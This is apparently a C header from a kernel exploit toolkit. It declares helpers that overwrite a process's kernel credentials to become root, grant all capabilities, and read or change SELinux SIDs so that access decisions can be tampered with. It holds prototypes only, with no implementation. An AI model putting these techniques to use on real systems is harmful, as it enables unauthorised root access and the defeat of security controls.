#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>

#include "kernel_specific.h"
#include "kernel_rw.h"


/**
 * Switch credentials to root's
 * @param cred_addr struct_cred's address
 * @return true if succeed to become root
 */
bool become_root(unsigned long cred_addr);

/**
 * Grab all capabilities
 * @param cred_addr struct_cred's address
 */
void get_all_caps(unsigned long cred_addr);

/**
 * Get the SID from struct cred structure
 * Can be used to another SID eg: kernel, init, shell, ...
 * Useful later to know which av_decision overwrite (SELinux)
 * @param cred_addr struct_cred's address
 * @return the SID
 */
unsigned int get_sid(unsigned long cred_addr);

/**
 * Change SID for struct cred structure
 * @param cred_addr struct_cred's address
 * @param sid
 */
void set_sid(unsigned long cred_addr, unsigned int sid);
